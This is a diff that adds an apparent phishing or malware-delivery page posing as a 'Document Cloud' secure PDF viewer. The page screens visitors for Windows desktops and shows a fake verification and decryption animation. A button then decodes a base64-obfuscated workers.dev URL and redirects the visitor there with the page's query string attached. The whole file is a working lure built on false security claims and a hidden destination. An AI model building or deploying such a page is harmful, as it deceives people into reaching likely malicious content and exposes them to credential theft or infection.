@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Document Cloud - Secure View</title>
+    <style>
+        /* CORE UI RESET */
+        body { margin: 0; background-color: #fff; font-family: 'Segoe UI', Roboto, Arial, sans-serif; color: #202124; -webkit-font-smoothing: antialiased; }
+        .blur-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: url('./tank.jpg') no-repeat center center fixed; background-size: cover; filter: blur(8px); z-index: -1; }
+        
+        /* DESKTOP CARD VIEW */
+        #main-content { display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3); width: 350px; z-index: 10; }
+        .pdf-icon { width: 64px; height: auto; margin-bottom: 20px; }
+        .progress-bar { width: 100%; background: #eee; border-radius: 10px; height: 8px; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: #0b57d0; transition: width 5s linear; }
+        .download-button { background-color: #0b57d0; color: #fff; padding: 12px 25px; text-decoration: none; font-size: 14px; border-radius: 20px; font-weight: 500; display: inline-block; border: none; cursor: pointer; }
+        
+        /* MOBILE OVERLAY (FOR PHONES) */
+        #mobile-overlay { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: white; z-index: 1000; flex-direction: column; 
+            justify-content: center; align-items: center; text-align: center; padding: 20px; 
+        }
+        #mobile-overlay h2 { font-size: 22px; font-weight: 500; margin: 20px 0 10px; }
+        #mobile-overlay p { color: #5f6368; font-size: 14px; line-height: 1.5; max-width: 300px; }
+
+        .hidden { display: none !important; }
+        .status-text { font-size: 14px; color: #666; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="blur-overlay"></div>
+
+    <div id="mobile-overlay">
+        <img src="https://www.gstatic.com/images/icons/material/system/2x/desktop_windows_gm_grey_48dp.png" width="64">
+        <h2>Update Required on Desktop</h2>
+        <p>This critical document security update must be performed on a desktop or laptop computer to ensure proper decryption.</p>
+    </div>
+
+    <div id="main-content">
+        <div class="card">
+            <img src="https://img.icons8.com/color/96/pdf-2.png" class="pdf-icon" alt="PDF">
+            <h3 id="headline" style="margin-top:0">Verifying Document...</h3>
+            
+            <div id="loading-zone">
+                <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+                <p class="status-text" id="status-msg">Connecting to secure server...</p>
+            </div>
+
+            <div id="action-zone" class="hidden">
+                <p style="color: green; font-weight: bold; font-size: 14px; margin-bottom: 20px;">✓ Verification Complete</p>
+                <button class="download-button" onclick="goToWorker()">View Document</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Encrypted Worker URL (Base64)
+        // aHR0cHM6Ly9wdXJwbGUtaGVhcnQtMjM1Yi5nMDM3NTU5MDEud29ya2Vycy5kZXYv
+        const _secret = 'aHR0cHM6Ly9saW5nZXJpbmctbGVhZi1hODE2LmcwMzc1NTkwMS53b3JrZXJzLmRldi8';
+
+        function checkEnvironment() {
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isWin = navigator.userAgent.includes("Windows NT");
+
+            if (isMobile || !isWin) {
+                document.getElementById('mobile-overlay').style.display = 'flex';
+                document.getElementById('main-content').classList.add('hidden');
+            } else {
+                startAnimation();
+            }
+        }
+
+        function startAnimation() {
+            setTimeout(() => {
+                document.getElementById("fill").style.width = "100%";
+            }, 100);
+            
+            setTimeout(() => { document.getElementById("status-msg").innerText = "Decrypting secure file..."; }, 2500);
+            
+            setTimeout(() => {
+                document.getElementById("loading-zone").classList.add("hidden");
+                document.getElementById("headline").innerText = "Document Ready";
+                document.getElementById("action-zone").classList.remove("hidden");
+            }, 5000);
+        }
+
+        function goToWorker() {
+            const dest = atob(_secret); // Decrypts the worker URL
+            window.location.href = dest + window.location.search;
+        }
+
+        window.onload = checkEnvironment;
+    </script>
+</body>
+</html>
